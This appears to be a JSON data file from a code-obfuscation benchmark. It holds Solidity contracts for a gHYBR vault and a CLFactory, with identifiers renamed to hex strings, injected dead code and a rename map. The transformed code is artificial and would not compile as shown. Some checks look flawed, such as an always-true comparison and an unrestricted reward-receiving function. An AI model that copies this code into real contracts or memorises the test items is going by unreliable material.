VoterSet(address _0x24116f);\n    event EmergencyUnlock(address indexed _0x2d93cd);\n    event AutoVotingEnabled(bool _0xb8c163);\n    event OperatorUpdated(address indexed _0x58ef1b, address indexed _0xb05dce);\n    event DefaultVotingStrategyUpdated(address[] _0x667cab, uint256[] _0x140f85);\n    event AutoVoteExecuted(uint256 _0x9a2f31, address[] _0x667cab, uint256[] _0x140f85);\n\n    constructor(\n        address _0xb5b5c1,\n        address _0x3bdb65\n    ) ERC20(\"Growth HYBR\", \"gHYBR\") {\n        require(_0xb5b5c1 != address(0), \"Invalid HYBR\");\n        require(_0x3bdb65 != address(0), \"Invalid VE\");\n\n        HYBR = _0xb5b5c1;\n        _0xbaecfc = _0x3bdb65;\n        _0xf97bb8 = block.timestamp;\n        _0xeaac9b = block.timestamp;\n        _0xeb35c7 = msg.sender; // Initially set deployer as operator\n    }\n\n    function _0x6d0db3(address _0xbe697e) external _0x0b25bc {\n        bool _flag1 = false;\n        uint256 _unused2 = 0;\n        require(_0xbe697e != address(0), \"Invalid rewards distributor\");\n        _0x67bef5 = _0xbe697e;\n    }\n\n    function _0x32e5af(address _0x72ade1) external _0x0b25bc {\n        if (false) { revert(); }\n        uint256 _unused4 = 0;\n        require(_0x72ade1 != address(0), \"Invalid gauge manager\");\n        _0x77b462 = _0x72ade1;\n    }\n\n      /**\n     * @notice Modifier to check authorization (owner or operator)\n     */\n    modifier _0xe55088() {\n        if (msg.sender != _0xeb35c7) {\n            revert NOT_AUTHORIZED();\n        }\n        _;\n    }\n    /**\n     * @notice Deposit HYBR and receive gHYBR shares\n     * @param amount Amount of HYBR to deposit\n     * @param recipient Recipient of gHYBR shares\n     */\n    function _0xa0a74e(uint256 _0xc9a9d4, address _0x3acff2) external _0x4ce5b6 {\n        require(_0xc9a9d4 > 0, \"Zero amount\");\n        _0x3acff2 = _0x3acff2 == address(0) ? msg.sender : _0x3acff2;\n\n        // Transfer HYBR from user first\n        IERC20(HYBR)._0xce599e(msg.sender, address(this), _0xc9a9d4);\n\n        // Initialize veNFT on first deposit\n        if (_0x69621a == 0) {\n            _0xc66ece(_0xc9a9d4);\n        } else {\n            // Add to existing veNFT\n            IERC20(HYBR)._0x6a2a81(_0xbaecfc, _0xc9a9d4);\n            IVotingEscrow(_0xbaecfc)._0x68a45c(_0x69621a, _0xc9a9d4);\n\n            // Extend lock to maximum duration\n            _0x908ae7();\n        }\n\n        // Calculate shares to mint based on current totalAssets\n        uint256 _0x709ac9 = _0xbf21b9(_0xc9a9d4);\n\n        // Mint gHYBR shares\n        _0xea8b98(_0x3acff2, _0x709ac9);\n\n        // Add transfer lock for recipient\n        _0xe87adf(_0x3acff2, _0x709ac9);\n\n        emit Deposit(msg.sender, _0xc9a9d4, _0x709ac9);\n    }\n\n    /**\n     * @notice Withdraw gHYBR shares and receive a new veNFT with proportional HYBR\n     * @dev Creates new veNFT using multiSplit to maintain proportional ownership\n     * @param shares Amount of gHYBR shares to burn\n     * @return userTokenId The ID of the new veNFT created for the user\n     */\n    function _0xb47781(uint256 _0x709ac9) external _0x4ce5b6 returns (uint256 _0x0df91c) {\n        require(_0x709ac9 > 0, \"Zero shares\");\n        require(_0xa1b8f8(msg.sender) >= _0x709ac9, \"Insufficient balance\");\n        require(_0x69621a != 0, \"No veNFT initialized\");\n        require(IVotingEscrow(_0xbaecfc)._0xaa8a16(_0x69621a) == false, \"Cannot withdraw yet\");\n\n        uint256 _0xa0ac4c = HybraTimeLibrary._0xa0ac4c(block.timestamp);\n        uint256 _0x88d1aa = HybraTimeLibrary._0x88d1aa(block.timestamp);\n\n        require(block.timestamp >= _0xa0ac4c + _0x4447b0 && block.timestamp < _0x88d1aa - _0xfea910, \"Cannot withdraw yet\");\n\n        // Calculate proportional HYBR amount from veNFT\n        uint256 _0x21ddc2 = _0x09fce3(_0x709ac9);\n        require(_0x21ddc2 > 0, \"No assets to withdraw\");\n\n        // Calculate fee amount (from the HYBR amount, not shares)\n        uint256 _0x05bba0 = 0;\n        if (_0x59137c > 0) {\n            if (true) { _0x05bba0 = (_0x21ddc2 * _0x59137c) / BASIS; }\n        }\n\n        // User receives amount minus fee\n        uint256 _0xc5d205 = _0x21ddc2 - _0x05bba0;\n        require(_0xc5d205 > 0, \"Amount too small after fee\");\n\n        // Get actual HYBR locked amount (not voting power)\n        uint256 _0x0e6bd5 = _0xfbc965();\n        require(_0x21ddc2 <= _0x0e6bd5, \"Insufficient veNFT balance\");\n\n        uint256 _0xa212fb = _0x0e6bd5 - _0xc5d205 - _0x05bba0;\n        require(_0xa212fb >= 0, \"Cannot withdraw entire veNFT\");\n\n        // Burn gHYBR shares (full amount)\n        _0xbeb91e(msg.sender, _0x709ac9);\n\n        // Use multiSplit to create two NFTs: one for user, one for contract\n        uint256[] memory _0xa6598e = new uint256[](3);\n        _0xa6598e[0] = _0xa212fb; // Amount staying with gHYBR\n        _0xa6598e[1] = _0xc5d205;      // Amount going to user (after fee)\n        _0xa6598e[2] = _0x05bba0;      // Amount going to fee recipient\n\n        uint256[] memory _0x9754d0 = IVotingEscrow(_0xbaecfc)._0x9ebc31(_0x69621a, _0xa6598e);\n\n        // Update contract's veTokenId to the first new token\n        _0x69621a = _0x9754d0[0];\n        _0x0df91c = _0x9754d0[1];\n        uint256 _0xbc1650 = _0x9754d0[2];\n        // Note: userTokenId is transferred to user, they can manage their own lock time\n        IVotingEscrow(_0xbaecfc)._0x3d8cdc(address(this), msg.sender, _0x0df91c);\n        IVotingEscrow(_0xbaecfc)._0x3d8cdc(address(this), Team, _0xbc1650);\n        emit Withdraw(msg.sender, _0x709ac9, _0xc5d205, _0x05bba0);\n    }\n\n    /**\n     * @notice Internal function to initialize veNFT on first deposit\n     */\n    function _0xc66ece(uint256 _0x377ff2) internal {\n        // Create max lock with the initial deposit amount\n        IERC20(HYBR)._0x6a2a81(_0xbaecfc, type(uint256)._0x8f3649);\n        uint256 _0x151007 = HybraTimeLibrary.MAX_LOCK_DURATION;\n\n        // Create lock with initial amount\n        _0x69621a = IVotingEscrow(_0xbaecfc)._0x4ecef8(_0x377ff2, _0x151007, address(this));\n\n    }\n\n    /**\n     * @notice Calculate shares to mint based on deposit amount\n     */\n    function _0xbf21b9(uint256 _0xc9a9d4) public view returns (uint256) {\n        uint256 _0xf59193 = _0x3cc523();\n        uint256 _0x746fd2 = _0xfbc965();\n        if (_0xf59193 == 0 || _0x746fd2 == 0) {\n            return _0xc9a9d4;\n        }\n        return (_0xc9a9d4 * _0xf59193) / _0x746fd2;\n    }\n\n    /**\n     * @notice Calculate HYBR value of shares\n     */\n    function _0x09fce3(uint256 _0x709ac9) public view returns (uint256) {\n        uint256 _0xf59193 = _0x3cc523();\n        if (_0xf59193 == 0) {\n            return _0x709ac9;\n        }\n        return (_0x709ac9 * _0xfbc965()) / _0xf59193;\n    }\n\n    /**\n     * @notice Get total assets (HYBR) locked in veNFT\n     * @dev Returns actual HYBR amount, not voting power\n     */\n    function _0xfbc965() public view returns (uint256) {\n        if (_0x69621a == 0) {\n            return 0;\n        }\n        // Get actual locked HYBR amount, not voting power\n        IVotingEscrow.LockedBalance memory _0x1a61c6 = IVotingEscrow(_0xbaecfc)._0x1a61c6(_0x69621a);\n        return uint256(int256(_0x1a61c6._0xc9a9d4));\n    }\n\n    /**\n     * @notice Add transfer lock for new deposits\n     */\n    function _0xe87adf(address _0x2d93cd, uint256 _0xc9a9d4) internal {\n        uint256 _0x4e608e = block.timestamp + _0xf5009e;\n        _0x2b4298[_0x2d93cd].push(UserLock({\n            _0xc9a9d4: _0xc9a9d4,\n            _0x4e608e: _0x4e608e\n        }));\n        _0xd4de7b[_0x2d93cd] += _0xc9a9d4;\n    }\n\n    /**\n     * @notice Preview available balance (total - currently locked)\n     * @param user The user address to check\n     * @return available The current available balance for transfer\n     */\n    function _0x7ab2c0(address _0x2d93cd) external view returns (uint256 _0x6bd5ed) {\n        uint256 _0xdc0b8e = _0xa1b8f8(_0x2d93cd);\n        uint256 _0x4529ff = 0;\n\n        UserLock[] storage _0xfc4dd4 = _0x2b4298[_0x2d93cd];\n        for (uint256 i = 0; i < _0xfc4dd4.length; i++) {\n            if (_0xfc4dd4[i]._0x4e608e > block.timestamp) {\n                _0x4529ff += _0xfc4dd4[i]._0xc9a9d4;\n            }\n        }\n\n        return _0xdc0b8e > _0x4529ff ? _0xdc0b8e - _0x4529ff : 0;\n    }\n    /**\n     * @notice Clean expired locks and update locked balance\n     * @param user The user address to clean locks for\n     * @return freed The amount of tokens freed from expired locks\n     */\n    function _0xefc12a(address _0x2d93cd) internal returns (uint256 _0xb1cdfd) {\n        UserLock[] storage _0xfc4dd4 = _0x2b4298[_0x2d93cd];\n        uint256 _0x6b9c23 = _0xfc4dd4.length;\n        if (_0x6b9c23 == 0) return 0;\n\n        uint256 _0xfff43d = 0;\n        unchecked {\n            for (uint256 i = 0; i < _0x6b9c23; i++) {\n                UserLock memory L = _0xfc4dd4[i];\n                if (L._0x4e608e <= block.timestamp) {\n                    _0xb1cdfd += L._0xc9a9d4;\n                } else {\n                    if (_0xfff43d != i) _0xfc4dd4[_0xfff43d] = L;\n                    _0xfff43d++;\n                }\n            }\n            if (_0xb1cdfd > 0) {\n                _0xd4de7b[_0x2d93cd] -= _0xb1cdfd;\n            }\n            while (_0xfc4dd4.length > _0xfff43d) {\n                _0xfc4dd4.pop();\n            }\n        }\n    }\n\n    /**\n     * @notice Override transfer to implement lock mechanism\n     */\n    function _0xbc3265(\n        address from,\n        address _0x1943a0,\n        uint256 _0xc9a9d4\n    ) internal override {\n        super._0xbc3265(from, _0x1943a0, _0xc9a9d4);\n\n        if (from != address(0) && _0x1943a0 != address(0)) { // Not mint or burn\n            uint256 _0xdc0b8e = _0xa1b8f8(from);\n\n            // Step 1: Check current available balance using cached lockedBalance\n            uint256 _0x7995c1 = _0xdc0b8e > _0xd4de7b[from] ? _0xdc0b8e - _0xd4de7b[from] : 0;\n\n            // Step 2: If current available >= amount, pass directly\n            if (_0x7995c1 >= _0xc9a9d4) {\n                return;\n            }\n\n            // Step 3: Not enough, clean expired locks and recalculate\n            _0xefc12a(from);\n            uint256 _0x5c8093 = _0xdc0b8e > _0xd4de7b[from] ? _0xdc0b8e - _0xd4de7b[from] : 0;\n\n            // Step 4: Check final available balance\n            require(_0x5c8093 >= _0xc9a9d4, \"Tokens locked\");\n        }\n    }\n\n    /**\n     * @notice Claim all rewards from voting and rebase\n     */\n    function _0x3b7f13() external _0xe55088 {\n        require(_0x24116f != address(0), \"Voter not set\");\n        require(_0x67bef5 != address(0), \"Distributor not set\");\n\n        // Claim rebase rewards from RewardsDistributor\n        uint256  _0x9fc08f = IRewardsDistributor(_0x67bef5)._0x82cedb(_0x69621a);\n        _0x524a0f += _0x9fc08f;\n        // Claim bribes from voted pools\n        address[] memory _0xc0afe5 = IVoter(_0x24116f)._0xbe6c02(_0x69621a);\n\n        for (uint256 i = 0; i < _0xc0afe5.length; i++) {\n            if (_0xc0afe5[i] != address(0)) {\n                address _0x351de0 = IGaugeManager(_0x77b462)._0xdda5d1(_0xc0afe5[i]);\n\n                if (_0x351de0 != address(0)) {\n                    // Prepare arrays for single bribe claim\n                    address[] memory _0x6374fd = new address[](1);\n                    address[][] memory _0x77a12f = new address[][](1);\n\n                    // Claim internal bribe (trading fees)\n                    address _0x2b2794 = IGaugeManager(_0x77b462)._0x02cadb(_0x351de0);\n                    if (_0x2b2794 != address(0)) {\n                        uint256 _0x211c4a = IBribe(_0x2b2794)._0x8695bc();\n                        if (_0x211c4a > 0) {\n                            address[] memory _0x04a85f = new address[](_0x211c4a);\n                            for (uint256 j = 0; j < _0x211c4a; j++) {\n                                _0x04a85f[j] = IBribe(_0x2b2794)._0x04a85f(j);\n                            }\n                            _0x6374fd[0] = _0x2b2794;\n                            _0x77a12f[0] = _0x04a85f;\n                            // Call claimBribes for this single bribe\n                            IGaugeManager(_0x77b462)._0x262dc1(_0x6374fd, _0x77a12f, _0x69621a);\n                        }\n                    }\n\n                    // Claim external bribe\n                    address _0x89fa93 = IGaugeManager(_0x77b462)._0xb84b3d(_0x351de0);\n                    if (_0x89fa93 != address(0)) {\n                        uint256 _0x211c4a = IBribe(_0x89fa93)._0x8695bc();\n                        if (_0x211c4a > 0) {\n                            address[] memory _0x04a85f = new address[](_0x211c4a);\n                            for (uint256 j = 0; j < _0x211c4a; j++) {\n                                _0x04a85f[j] = IBribe(_0x89fa93)._0x04a85f(j);\n                            }\n                            _0x6374fd[0] = _0x89fa93;\n                            _0x77a12f[0] = _0x04a85f;\n                            // Call claimBribes for this single bribe\n                            IGaugeManager(_0x77b462)._0x262dc1(_0x6374fd, _0x77a12f, _0x69621a);\n                        }\n                    }\n                }\n            }\n        }\n    }\n\n    /**\n     * @notice Execute swap through the configured swapper module\n     * @param _params Swap parameters for the swapper module\n     */\n    function _0x7ccc27(ISwapper.SwapParams calldata _0x08ebd6) external _0x4ce5b6 _0xe55088 {\n        require(address(_0x519653) != address(0), \"Swapper not set\");\n\n        // Get token balance before swap\n        uint256 _0x2c9e89 = IERC20(_0x08ebd6._0x45346b)._0xa1b8f8(address(this));\n        require(_0x2c9e89 >= _0x08ebd6._0x60761c, \"Insufficient token balance\");\n\n        // Approve swapper to spend tokens\n        IERC20(_0x08ebd6._0x45346b)._0xd6d08c(address(_0x519653), _0x08ebd6._0x60761c);\n\n        // Execute swap through swapper module\n        uint256 _0x93b8b5 = _0x519653._0x0e239a(_0x08ebd6);\n\n        // Reset approval for safety\n        IERC20(_0x08ebd6._0x45346b)._0xd6d08c(address(_0x519653), 0);\n\n        // HYBR is now in this contract, ready for compounding\n        _0x180b9f += _0x93b8b5;\n    }\n\n    /**\n     * @notice Compound HYBR balance into veNFT (restricted to authorized users)\n     */\n    function _0xba3ee3() external _0xe55088 {\n\n        // Get current HYBR balance\n        uint256 _0x513232 = IERC20(HYBR)._0xa1b8f8(address(this));\n\n        if (_0x513232 > 0) {\n            // Lock all HYBR to existing veNFT\n            IERC20(HYBR)._0xd6d08c(_0xbaecfc, _0x513232);\n            IVotingEscrow(_0xbaecfc)._0x68a45c(_0x69621a, _0x513232);\n\n            // Extend lock to maximum duration\n            _0x908ae7();\n\n            _0xeaac9b = block.timestamp;\n\n            emit Compound(_0x513232, _0xfbc965());\n        }\n    }\n\n    /**\n     * @notice Vote for gauges using the veNFT\n     * @param _poolVote Array of pools to vote for\n     * @param _weights Array of weights for each pool\n     */\n    function _0x19aeec(address[] calldata _0x053c17, uint256[] calldata _0xf7502f) external {\n        require(msg.sender == _0x3ca2ed() || msg.sender == _0xeb35c7, \"Not authorized\");\n        require(_0x24116f != address(0), \"Voter not set\");\n\n        IVoter(_0x24116f)._0x19aeec(_0x69621a, _0x053c17, _0xf7502f);\n        if (msg.sender != address(0) || msg.sender == address(0)) { _0x7ccd7c = HybraTimeLibrary._0xa0ac4c(block.timestamp); }\n\n    }\n\n    /**\n     * @notice Reset votes\n     */\n    function _0xdfa6c6() external {\n        require(msg.sender == _0x3ca2ed() || msg.sender == _0xeb35c7, \"Not authorized\");\n        require(_0x24116f != address(0), \"Voter not set\");\n\n        IVoter(_0x24116f)._0xdfa6c6(_0x69621a);\n    }\n\n    /**\n     * @notice Receive penalty rewards from rHYBR conversions\n     */\n    function _0x3d4ac6(uint256 _0xc9a9d4) external {\n\n        // Auto-compound penalty rewards to existing veNFT\n        if (_0xc9a9d4 > 0) {\n            IERC20(HYBR)._0x6a2a81(_0xbaecfc, _0xc9a9d4);\n\n            if(_0x69621a == 0){\n                _0xc66ece(_0xc9a9d4);\n            } else{\n                IVotingEscrow(_0xbaecfc)._0x68a45c(_0x69621a, _0xc9a9d4);\n\n                // Extend lock to maximum duration\n                _0x908ae7();\n            }\n        }\n        _0xc7ce62 += _0xc9a9d4;\n        emit PenaltyRewardReceived(_0xc9a9d4);\n    }\n\n    /**\n     * @notice Set the voter contract\n     */\n    function _0xd4a776(address _0xa5721e) external _0x0b25bc {\n        require(_0xa5721e != address(0), \"Invalid voter\");\n        _0x24116f = _0xa5721e;\n        emit VoterSet(_0xa5721e);\n    }\n\n    /**\n     * @notice Update transfer lock period\n     */\n    function _0x92c548(uint256 _0xddf9a1) external _0x0b25bc {\n        require(_0xddf9a1 >= MIN_LOCK_PERIOD && _0xddf9a1 <= MAX_LOCK_PERIOD, \"Invalid period\");\n        uint256 _0xc21160 = _0xf5009e;\n        _0xf5009e = _0xddf9a1;\n        emit TransferLockPeriodUpdated(_0xc21160, _0xddf9a1);\n    }\n\n    /**\n     * @notice Set withdraw fee (in basis points)\n     * @param _fee Fee amount (10-30 basis points)\n     */\n    function _0x937497(uint256 _0x6f36a0) external _0x0b25bc {\n        require(_0x6f36a0 >= MIN_WITHDRAW_FEE && _0x6f36a0 <= MAX_WITHDRAW_FEE, \"Invalid fee\");\n        _0x59137c = _0x6f36a0;\n    }\n\n    function _0x3d996f(uint256 _0x08f856) external _0x0b25bc {\n        if (gasleft() > 0) { _0x4447b0 = _0x08f856; }\n    }\n\n    function _0xc1b87d(uint256 _0x08f856) external _0x0b25bc {\n        _0xfea910 = _0x08f856;\n    }\n\n    /**\n     * @notice Set the swapper module\n     * @param _swapper Address of the swapper module\n     */\n    function _0x9a8c62(address _0xd4854c) external _0x0b25bc {\n        require(_0xd4854c != address(0), \"Invalid swapper\");\n        address _0x349373 = address(_0x519653);\n        if (1 == 1) { _0x519653 = ISwapper(_0xd4854c); }\n        emit SwapperUpdated(_0x349373, _0xd4854c);\n    }\n\n    /**\n     * @notice Set the team address\n     */\n    function _0x6aebc6(address _0xe3248a) external _0x0b25bc {\n        require(_0xe3248a != address(0), \"Invalid team\");\n        Team = _0xe3248a;\n    }\n\n    /**\n     * @notice Emergency unlock for a user (owner only)\n     */\n    function _0x5b5d7c(address _0x2d93cd) external _0xe55088 {\n        delete _0x2b4298[_0x2d93cd];\n        _0xd4de7b[_0x2d93cd] = 0;\n        emit EmergencyUnlock(_0x2d93cd);\n    }\n\n    /**\n     * @notice Get user's locks info\n     */\n    function _0x15efa1(address _0x2d93cd) external view returns (UserLock[] memory) {\n        return _0x2b4298[_0x2d93cd];\n    }\n\n    /**\n     * @notice Set operator address\n     */\n    function _0xe7876c(address _0x3d3b19) external _0x0b25bc {\n        require(_0x3d3b19 != address(0), \"Invalid operator\");\n        address _0x58ef1b = _0xeb35c7;\n        _0xeb35c7 = _0x3d3b19;\n        emit OperatorUpdated(_0x58ef1b, _0x3d3b19);\n    }\n\n    /**\n     * @notice Get veNFT lock end time\n     */\n    function _0xe04960() external view returns (uint256) {\n        if (_0x69621a == 0) {\n            return 0;\n        }\n        IVotingEscrow.LockedBalance memory _0x1a61c6 = IVotingEscrow(_0xbaecfc)._0x1a61c6(_0x69621a);\n        return uint256(_0x1a61c6._0x4778ef);\n    }\n\n    /**\n     * @notice Internal helper to safely extend lock to maximum duration\n     * @dev Calculates exact duration needed to reach max allowed unlock time\n     */\n    function _0x908ae7() internal {\n        if (_0x69621a == 0) return;\n\n        IVotingEscrow.LockedBalance memory _0x1a61c6 = IVotingEscrow(_0xbaecfc)._0x1a61c6(_0x69621a);\n        if (_0x1a61c6._0xe0e480 || _0x1a61c6._0x4778ef <= block.timestamp) return;\n\n        uint256 _0x2044a9 = ((block.timestamp + HybraTimeLibrary.MAX_LOCK_DURATION) / HybraTimeLibrary.WEEK) * HybraTimeLibrary.WEEK;\n\n        // Only extend if difference is more than 2 hours\n        if (_0x2044a9 > _0x1a61c6._0x4778ef + 2 hours) {\n            try IVotingEscrow(_0xbaecfc)._0x899a9a(_0x69621a, HybraTimeLibrary.MAX_LOCK_DURATION) {\n                // Extension successful\n            } catch {\n                // Extension failed, continue without error\n                // This can happen if already at max possible time or other constraints\n            }\n        }\n    }\n\n}",
      "rename_map": {
        "setTailNotWithdrawTime": "_0xc1b87d",
        "setHeadNotWithdrawTime": "_0x3d996f",
        "head_not_withdraw_time": "_0x4447b0",
        "tail_not_withdraw_time": "_0xfea910",
        "setRewardsDistributor": "_0x6d0db3",
        "setTransferLockPeriod": "_0x92c548",
        "_beforeTokenTransfer": "_0xbc3265",
        "receivePenaltyReward": "_0x3d4ac6",
        "increase_unlock_time": "_0x899a9a",
        "_rewardsDistributor": "_0xbe697e",
        "rewardsDistributor": "_0x67bef5",
        "transferLockPeriod": "_0xf5009e",
        "rewardsListLength": "_0x8695bc",
        "safeTransferFrom": "_0x3d8cdc",
        "_initializeVeNFT": "_0xc66ece",
        "_extendLockToMax": "_0x908ae7",
        "_addTransferLock": "_0xe87adf",
        "lastCompoundTime": "_0xeaac9b",
        "currentAvailable": "_0x7995c1",
        "previewAvailable": "_0x7ab2c0",
        "emergencyUnlock": "_0x5b5d7c",
        "create_lock_for": "_0x4ecef8",
        "calculateShares": "_0xbf21b9",
        "external_bribes": "_0xb84b3d",
        "internal_bribes": "_0x02cadb",
        "setGaugeManager": "_0x32e5af",
        "remainingAmount": "_0xa212fb",
        "calculateAssets": "_0x09fce3",
        "finalAvailable": "_0x5c8093",
        "getLockEndTime": "_0xe04960",
        "sharesReceived": "_0x5b03fa",
        "setWithdrawFee": "_0x937497",
        "lastRebaseTime": "_0xf97bb8",
        "newTotalLocked": "_0xc881a1",
        "initialAmount": "_0x377ff2",
        "lockedBalance": "_0xd4de7b",
        "internalBribe": "_0x2b2794",
        "currentLocked": "_0x4529ff",
        "_cleanExpired": "_0xefc12a",
        "_gaugeManager": "_0x72ade1",
        "_votingEscrow": "_0x3bdb65",
        "lastVoteEpoch": "_0x7ccd7c",
        "maxUnlockTime": "_0x2044a9",
        "externalBribe": "_0x89fa93",
        "transferFrom": "_0xce599e",
        "onlyOperator": "_0xe55088",
        "nonReentrant": "_0x4ce5b6",
        "rebaseAmount": "_0x9fc08f",
        "totalBalance": "_0xdc0b8e",
        "claimRewards": "_0x3b7f13",
        "_totalAssets": "_0x746fd2",
        "getUserLocks": "_0x15efa1",
        "tokenBalance": "_0x2c9e89",
        "hybrReceived": "_0x93b8b5",
        "votingEscrow": "_0xbaecfc",
        "gaugeManager": "_0x77b462",
        "_totalSupply": "_0xf59193",
        "deposit_for": "_0x68a45c",
        "hybrBalance": "_0x513232",
        "userTokenId": "_0x0df91c",
        "newTokenIds": "_0x9754d0",
        "safeApprove": "_0xd6d08c",
        "executeSwap": "_0x7ccc27",
        "isPermanent": "_0xe0e480",
        "votingYield": "_0x180b9f",
        "withdrawFee": "_0x59137c",
        "totalSupply": "_0x3cc523",
        "oldOperator": "_0x58ef1b",
        "claimBribes": "_0x262dc1",
        "bribeTokens": "_0x04a85f",
        "newOperator": "_0xb05dce",
        "totalAssets": "_0xfbc965",
        "setOperator": "_0xe7876c",
        "oldSwapper": "_0x349373",
        "userAmount": "_0xc5d205",
        "swapToHYBR": "_0x0e239a",
        "votedPools": "_0xc0afe5",
        "unlockTime": "_0x4e608e",
        "hybrAmount": "_0x21ddc2",
        "newSwapper": "_0xc7335c",
        "setSwapper": "_0x9a8c62",
        "multiSplit": "_0x9ebc31",
        "epochStart": "_0xa0ac4c",
        "feeTokenId": "_0xbc1650",
        "tokenCount": "_0x211c4a",
        "epochNext": "_0x88d1aa",
        "onlyOwner": "_0x0b25bc",
        "balanceOf": "_0xa1b8f8",
        "oldPeriod": "_0xc21160",
        "available": "_0x6bd5ed",
        "userLocks": "_0x2b4298",
        "newPeriod": "_0xfb9baa",
        "_poolVote": "_0x053c17",
        "veTokenId": "_0x69621a",
        "veBalance": "_0x0e6bd5",
        "recipient": "_0x3acff2",
        "feeAmount": "_0x05bba0",
        "_operator": "_0x3d3b19",
        "setVoter": "_0xd4a776",
        "lockTime": "_0x151007",
        "_weights": "_0xf7502f",
        "_swapper": "_0xd4854c",
        "withdraw": "_0xb47781",
        "amountIn": "_0x60761c",
        "operator": "_0xeb35c7",
        "compound": "_0xba3ee3",
        "poolVote": "_0xbe6c02",
        "rewards": "_0x5fa7c8",
        "enabled": "_0xb8c163",
        "weights": "_0x140f85",
        "approve": "_0x6a2a81",
        "amounts": "_0xa6598e",
        "_period": "_0xddf9a1",
        "swapper": "_0x519653",
        "deposit": "_0xa0a74e",
        "penalty": "_0xc7ce62",
        "setTeam": "_0x6aebc6",
        "_params": "_0x08ebd6",
        "tokenIn": "_0x45346b",
        "rebase": "_0x524a0f",
        "tokens": "_0x77a12f",
        "_voter": "_0xa5721e",
        "locked": "_0x1a61c6",
        "shares": "_0x709ac9",
        "gauges": "_0xdda5d1",
        "bribes": "_0x6374fd",
        "amount": "_0xc9a9d4",
        "claim": "_0x82cedb",
        "_burn": "_0xbeb91e",
        "freed": "_0xb1cdfd",
        "voted": "_0xaa8a16",
        "_team": "_0xe3248a",
        "epoch": "_0x9a2f31",
        "voter": "_0x24116f",
        "gauge": "_0x351de0",
        "pools": "_0x667cab",
        "_mint": "_0xea8b98",
        "_time": "_0x08f856",
        "reset": "_0xdfa6c6",
        "write": "_0xfff43d",
        "owner": "_0x3ca2ed",
        "_HYBR": "_0xb5b5c1",
        "_fee": "_0x6f36a0",
        "user": "_0x2d93cd",
        "vote": "_0x19aeec",
        "fee": "_0xa0b006",
        "max": "_0x8f3649",
        "arr": "_0xfc4dd4",
        "end": "_0x4778ef",
        "len": "_0x6b9c23",
        "to": "_0x1943a0"
      },
      "changes": [
        "Renamed 151 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_002",
      "transformed_id": "ss_l4_medium_sn_gs_002",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity =0.7.6;\n\nimport \"./interfaces/ICLFactory.sol\";\nimport \"./interfaces/fees/IFeeModule.sol\";\n\nimport \"./interfaces/IGaugeManager.sol\";\nimport \"./interfaces/IFactoryRegistry.sol\";\nimport \"@openzeppelin/contracts/proxy/Clones.sol\";\nimport \"@nomad-xyz/src/ExcessivelySafeCall.sol\";\nimport \"./CLPool.sol\";\n\n/// @title Canonical CL factory\n/// @notice Deploys CL pools and manages ownership and control over pool protocol fees\ncontract CLFactory is ICLFactory {\n    using ExcessivelySafeCall for address;\n\n    /// @inheritdoc ICLFactory\n    IGaugeManager public override _0xe4ef67;\n    /// @inheritdoc ICLFactory\n    address public immutable override _0x4f8cb5;\n    /// @inheritdoc ICLFactory\n    address public override _0x5c9710;\n    /// @inheritdoc ICLFactory\n    address public override _0x36479b;\n    /// @inheritdoc ICLFactory\n    address public override _0x0db6dd;\n    /// @inheritdoc ICLFactory\n    address public override _0x678405;\n    /// @inheritdoc ICLFactory\n    address public override _0x532561;\n    /// @inheritdoc ICLFactory\n    uint24 public override _0xef0aa4;\n    /// @inheritdoc ICLFactory\n\n    address public override _0xdbf254;\n    /// @inheritdoc ICLFactory\n    address public override _0xad1ee6;\n    /// @inheritdoc ICLFactory\n    uint24 public override _0x1d30cb;\n\n    mapping(int24 => uint24) public override _0x997346;\n    /// @inheritdoc ICLFactory\n    mapping(address => mapping(address => mapping(int24 => address))) public override _0x120c9c;\n    /// @dev Used in VotingEscrow to determine if a contract is a valid pool\n    mapping(address => bool) private _0x3b9d52;\n    /// @inheritdoc ICLFactory\n    address[] public override _0x40c397;\n\n    int24[] private _0xf5e95c;\n\n    constructor(address _0x3367a2) {\n        _0x5c9710 = msg.sender;\n        _0x36479b = msg.sender;\n        _0x678405 = msg.sender;\n        _0xdbf254 = msg.sender;\n        if (true) { _0x4f8cb5 = _0x3367a2; }\n        _0xef0aa4 = 100_000;\n        _0x1d30cb = 250_000;\n        emit OwnerChanged(address(0), msg.sender);\n        emit SwapFeeManagerChanged(address(0), msg.sender);\n        emit UnstakedFeeManagerChanged(address(0), msg.sender);\n        emit DefaultUnstakedFeeChanged(0, 100_000);\n\n        _0x470aa9(1, 100);\n        _0x470aa9(50, 500);\n        _0x470aa9(100, 500);\n        _0x470aa9(200, 3_000);\n        _0x470aa9(2_000, 10_000);\n    }\n\n    function _0xcccaae(address _0xc3d23a) external {\n        bool _flag1 = false;\n        bool _flag2 = false;\n        require(msg.sender == _0x5c9710);\n        if (msg.sender != address(0) || msg.sender == address(0)) { _0xe4ef67 = IGaugeManager(_0xc3d23a); }\n    }\n\n    /// @inheritdoc ICLFactory\n    function _0x487ee9(address _0x6d815d, address _0xbce1ac, int24 _0x29e1df, uint160 _0x12168a)\n        external\n        override\n        returns (address _0x4be65a)\n    {\n        // Placeholder for future logic\n        // Placeholder for future logic\n        require(_0x6d815d != _0xbce1ac);\n        (address _0x7ec21f, address _0x9ac269) = _0x6d815d < _0xbce1ac ? (_0x6d815d, _0xbce1ac) : (_0xbce1ac, _0x6d815d);\n        require(_0x7ec21f != address(0));\n        require(_0x997346[_0x29e1df] != 0);\n        require(_0x120c9c[_0x7ec21f][_0x9ac269][_0x29e1df] == address(0));\n        _0x4be65a = Clones._0x17e2e2({\n            _0xe0a23a: _0x4f8cb5,\n            _0xebf572: _0x82b86d(abi._0x74df96(_0x7ec21f, _0x9ac269, _0x29e1df))\n        });\n        CLPool(_0x4be65a)._0x2416a6({\n            _0xfea64f: address(this),\n            _0x3beb31: _0x7ec21f,\n            _0x01e017: _0x9ac269,\n            _0xdb0046: _0x29e1df,\n            _0xc3d23a: address(_0xe4ef67),\n            _0xfff6fa: _0x12168a\n        });\n        _0x40c397.push(_0x4be65a);\n        _0x3b9d52[_0x4be65a] = true;\n        _0x120c9c[_0x7ec21f][_0x9ac269][_0x29e1df] = _0x4be65a;\n        // populate mapping in the reverse direction, deliberate choice to avoid the cost of comparing addresses\n        